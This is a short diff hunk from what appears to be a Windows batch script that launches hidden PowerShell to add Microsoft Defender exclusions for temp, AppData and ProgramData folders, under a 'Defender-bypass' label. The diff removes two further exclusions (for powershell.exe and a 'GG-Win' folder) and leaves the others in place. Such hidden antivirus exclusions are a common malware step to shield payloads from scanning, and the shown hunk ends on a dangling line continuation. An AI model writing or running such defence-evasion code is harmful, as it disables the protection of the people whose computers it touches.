@@ -11,8 +11,6 @@ Powershell -WindowStyle Hidden -Command ^
   "Add-MpPreference -ExclusionPath '%tmp%';" ^
   "Add-MpPreference -ExclusionPath '%appdata%';" ^
   "Add-MpPreference -ExclusionPath '%systemdrive%\programdata\Windata';" ^
-  "Add-MpPreference -ExclusionProcess 'powershell.exe';" ^
-  "Add-MpPreference -ExclusionPath 'C:\ProgramData\GG-Win';"
 
 echo -----------Defender-bypass------------------------
 
